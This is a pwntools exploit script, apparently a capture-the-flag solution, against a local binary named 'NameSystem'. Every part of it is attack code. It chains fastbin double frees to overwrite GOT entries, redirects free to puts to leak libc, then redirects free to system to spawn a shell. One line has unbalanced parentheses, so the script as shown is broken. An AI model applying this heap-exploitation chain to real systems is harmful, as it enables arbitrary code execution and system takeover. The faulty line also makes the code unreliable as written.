from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context(arch = 'amd64', os = 'linux')
debug=1
if debug==0:
    io = remote()
elif debug==1:
    io =  process("./NameSystem")
elf = ELF("./NameSystem")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)

def add(size,name):
    ru("Your choice :\n")#[10,60]
    sl(1)    
    ru('Name Size:')
    sl(size)
    ru('Name:')
    sl(name)

def drop(i):
    ru("Your choice :\n")
    sl(3)    
    ru('The id you want to delete:')
    sl(i)

for i in range(18):
    add(0x10,"1"*1)
#0x70 double free
add(0x60,"1"*10)
add(0x60,"1"*10)
drop(0)
drop(0)
drop(19)
drop(16)
drop(17)

#0x60 doublefree
add(0x60-8,"1"*10)
add(0x60-8,"1"*10)
add(0x60-8,"1"*10)
drop(0)
drop(0)
drop(19)
drop(16)
drop(17)

#0x50 doublefree
add(0x50-8,"1"*10)
add(0x50-8,"1"*10)
add(0x50-8,"1"*10)
drop(0)
drop(0)
drop(19)
drop(16)
drop(17)

#rangwei
for i in range(8):
    drop(0)
#free->puts
add(0x60-8,p64(0x602000-6))
add(0x60-8,'1')
add(0x60-8,'1')
add(0x60-8,p64(0x50)+'\x00'*6+elf.plt['puts'])[0:6])

#a name's address ->got[atoi]
add(0x60,p64(0x6020a0-0x13))
add(0x60,'1')
add(0x60,'1')
add(0x60,'\x00'*3+p64(elf.got['atoi']))

#leak libc :puts got[atoi]
drop(0)
atoi_addr=u64(ru('\n').ljust(8,'\x00'))
log.info(hex(atoi_addr))
searcher=LibcSearcher("atoi",int(atoi_addr))
base=atoi_addr-searcher.dump('atoi')

#free->system
add(0x50-8,p64(0x602002))
add(0x50-8,'/bin/sh\x00')
add(0x50-8,'1')
add(0x50-8,'\x00'*6+p64(base+searcher.dump('system'))[0:6])

#getshell
drop(17)

io.interactive()